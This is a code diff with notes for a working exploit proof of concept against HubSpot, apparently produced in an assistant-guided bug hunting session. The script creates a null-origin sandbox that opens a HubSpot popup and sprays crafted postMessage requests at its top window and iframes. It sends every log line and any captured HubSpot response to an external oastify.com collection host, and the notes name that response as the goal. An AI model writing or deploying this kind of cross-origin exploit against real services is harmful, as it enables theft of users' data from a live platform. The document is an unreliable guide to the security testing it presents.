@@ -19,98 +19,114 @@ window.addEventListener('message', function(e) {
         const blob = new Blob([`
 <html>
 <body>
-<h2>Sandbox with Null Origin</h2>
-<div id="log" style="font-family:monospace;font-size:11px;background:#000;color:#0f0;padding:10px;"></div>
+<h2>Null Origin Sandbox</h2>
+<div id="log" style="font-family:monospace;font-size:11px;background:#000;color:#0f0;padding:10px;max-height:350px;overflow:auto;"></div>
 <script>
 const E = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
 
 function l(m) { 
-    document.getElementById('log').innerHTML += '<br>' + m;
+    const d = document.getElementById('log');
+    d.innerHTML += '<br>' + m;
+    d.scrollTop = d.scrollHeight;
     new Image().src = E + '/?s=' + encodeURIComponent(m); 
 }
 
-l('sandbox_started');
+l('START');
 l('origin=' + window.origin);
 
-// Listen for responses
+// Listen for ALL messages (including from HubSpot)
 window.addEventListener('message', function(r) {
-    l('GOT_RESPONSE_from=' + r.origin);
-    l('response_type=' + (r.data.type || 'unknown'));
-    new Image().src = E + '/?RESPONSE=' + encodeURIComponent(JSON.stringify(r.data).substring(0, 400));
+    l('!!!MESSAGE_RECEIVED!!!');
+    l('from=' + r.origin);
+    l('type=' + (r.data.type || typeof r.data));
+    new Image().src = E + '/?MSG=' + encodeURIComponent(JSON.stringify(r.data).substring(0, 500));
 });
 
-l('opening_hubspot');
+l('opening_hub');
 
-try {
-    let h = window.open('https://app-eu1.hubspot.com', 'hub', 'width=900,height=700');
+let h = window.open('https://app-eu1.hubspot.com', 'hub', 'width=900,height=700');
+
+if (!h) {
+    l('blocked');
+} else {
+    l('opened');
     
-    if (!h) {
-        l('ERROR_popup_blocked');
-    } else {
-        l('popup_opened');
-        l('popup_closed=' + h.closed);
+    let attempts = 0;
+    let checker = setInterval(() => {
+        attempts++;
         
-        let attempts = 0;
-        let loaded = false;
-        
-        let checker = setInterval(() => {
-            attempts++;
+        try {
+            h.origin;
+            if (attempts % 20 === 0) l('wait_' + attempts);
+        } catch(e) {
+            clearInterval(checker);
+            l('loaded_' + attempts);
             
-            try {
-                // Try to access origin - will throw when cross-origin
-                let test = h.origin;
+            // Wait for HubSpot to initialize
+            setTimeout(() => {
+                l('SENDING_TO_TOP_WINDOW');
                 
-                if (attempts % 10 === 0) {
-                    l('still_same_origin_attempt=' + attempts);
-                }
-            } catch(e) {
-                if (!loaded) {
-                    loaded = true;
-                    clearInterval(checker);
+                // Send to main window
+                h.postMessage({
+                    type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
+                    commandId: 'test123',
+                    featureId: 'email_editor',
+                    parameters: {},
+                    resultCount: 1,
+                    language: 'en',
+                    objectId: '46962361',
+                    applicationId: 'email',
+                    basePath: '/',
+                    maxPollingAttempts: 5,
+                    pollingInterval: 1000
+                }, '*');
+                
+                l('sent_to_top');
+                
+                // Try sending to frames (HubSpot has multiple iframes)
+                setTimeout(() => {
+                    l('SENDING_TO_FRAMES');
                     
-                    l('hubspot_loaded_after=' + attempts + '_attempts');
-                    l('error_msg=' + e.message.substring(0, 50));
-                    l('popup_still_open=' + !h.closed);
+                    try {
+                        // Try to send to frames[0], frames[1], etc.
+                        for(let i = 0; i < 10; i++) {
+                            try {
+                                if (h.frames[i]) {
+                                    h.frames[i].postMessage({
+                                        type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
+                                        commandId: 'test' + i,
+                                        featureId: 'test',
+                                        parameters: {},
+                                        resultCount: 1,
+                                        language: 'en',
+                                        objectId: '46962361',
+                                        applicationId: 'test',
+                                        basePath: '/',
+                                        maxPollingAttempts: 1,
+                                        pollingInterval: 100
+                                    }, '*');
+                                    l('sent_to_frame_' + i);
+                                }
+                            } catch(err) {
+                                l('frame_' + i + '_error');
+                            }
+                        }
+                    } catch(e) {
+                        l('frames_error=' + e.message);
+                    }
                     
-                    // Wait for HubSpot to fully initialize
-                    setTimeout(() => {
-                        l('sending_exploit_1');
-                        
-                        h.postMessage({
-                            type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
-                            commandId: 'exploit',
-                            featureId: 'test',
-                            parameters: {},
-                            resultCount: 1,
-                            language: 'en',
-                            objectId: '46962361',
-                            applicationId: 'crm',
-                            basePath: '/',
-                            maxPollingAttempts: 5,
-                            pollingInterval: 1000
-                        }, '*');
-                        
-                        l('exploit_1_sent');
-                        
-                        // Try a simpler message too
-                        setTimeout(() => {
-                            l('sending_exploit_2');
-                            h.postMessage({test: 'hello'}, '*');
-                            l('exploit_2_sent');
-                        }, 1000);
-                        
-                    }, 2000);
-                }
-            }
-            
-            if (attempts > 150) {
-                clearInterval(checker);
-                l('timeout_after_150_attempts');
-            }
-        }, 100);
-    }
-} catch(err) {
-    l('CRITICAL_ERROR=' + err.message);
+                    l('DONE_SENDING');
+                    
+                }, 1000);
+                
+            }, 3000);
+        }
+        
+        if (attempts > 150) {
+            clearInterval(checker);
+            l('timeout');
+        }
+    }, 100);
 }
 <\/script>
 </body>
@@ -118,7 +134,6 @@ try {
         `], {type: 'text/html'});
         
         const blobUrl = URL.createObjectURL(blob);
-        log('blob_created=' + blobUrl.substring(0, 50));
         
         const iframe = document.createElement('iframe');
         iframe.sandbox = 'allow-scripts allow-popups allow-popups-to-escape-sandbox';
@@ -140,26 +155,30 @@ if(window.opener) {
 
 ---
 
-## **This version logs:**
+### **What This Does:**
 
-1. ✅ `origin=null` (confirmed working)
-2. Opening HubSpot popup
-3. Whether popup was blocked
-4. Polling attempts to detect when HubSpot loads
-5. **Two different exploit messages** (one complex, one simple)
-6. Any responses received
+1. ✅ Creates null origin sandbox (working)
+2. ✅ Opens HubSpot popup
+3. ✅ Sends message to **top window**
+4. ✅ **Also tries sending to all iframes** (frames[0] through frames[9])
+5. ✅ **Listens for ANY message** from HubSpot (to see if we get responses)
 
 ---
 
-## **Push this update and check Burp for:**
+### **Expected Logs:**
 ```
-/?s=sandbox_started
+/?s=START
 /?s=origin=null
-/?s=opening_hubspot
-/?s=popup_opened
-/?s=hubspot_loaded_after=XX_attempts
-/?s=sending_exploit_1
-/?s=exploit_1_sent
-/?s=sending_exploit_2
-/?s=exploit_2_sent
-/?RESPONSE=...          ← THE GOAL!
+/?s=opening_hub
+/?s=opened
+/?s=loaded_XX
+/?s=SENDING_TO_TOP_WINDOW
+/?s=sent_to_top
+/?s=SENDING_TO_FRAMES
+/?s=sent_to_frame_0
+/?s=sent_to_frame_1
+/?s=sent_to_frame_2
+...
+/?s=DONE_SENDING
+/?MSG=...                ← ANY response from HubSpot
+/?s=!!!MESSAGE_RECEIVED!!!
